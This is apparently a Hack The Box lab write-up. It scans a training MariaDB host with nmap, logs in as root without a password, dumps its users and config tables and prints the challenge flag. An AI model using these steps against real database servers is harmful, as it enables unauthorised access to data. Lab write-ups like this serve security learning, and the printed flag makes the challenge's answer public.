nmap scanning:
~~~
nmap 10.129.95.232 -sC -sV     
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 08:28 EDT
Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 75.00% done; ETC: 08:32 (0:00:03 remaining)
Nmap scan report for 10.129.95.232
Host is up (0.52s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, Speaks41ProtocolOld, Interactive Client, Supports Transactions, Supports Load DataLocal, Found Rows, DontAllowDatabaseTableColumn, ODBCClient, LongColumnFlag, ConnectWithDatabase, IgnoreSigpipes, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: ![-iL~X|(N2LjO-3W>n1
|  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.43 seconds
~~~

mysql:
it is freely available open source relational Database management System thet uses structured Query language (sql)

salt 
salting is the random characters to data, like passwords, or other secret which want to hash 

MySQL includes a  "`mysql_native_password`" plugin that implements native authentication; that is, authentication based on the password hashing method in use from before the introduction of pluggable authentication.



we try to exploit the mysql databases by some exploits in metasploit but its shows this server is not vuln 

after try to get the access by mysql 
-h for host and -u for connect with root without password 
~~~
mysql -h 10.129.95.232 -u root
~~~

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2161
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
~~~
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.248 sec)

MariaDB [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.247 sec)

MariaDB [htb]> SELECT * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.248 sec)

MariaDB [htb]> SELECT * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.248 sec)

MariaDB [htb]> 


flag:7b4bec00d1a39e3dd4e021ec3d915da8
~~~

finally finished !!!!...




https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql



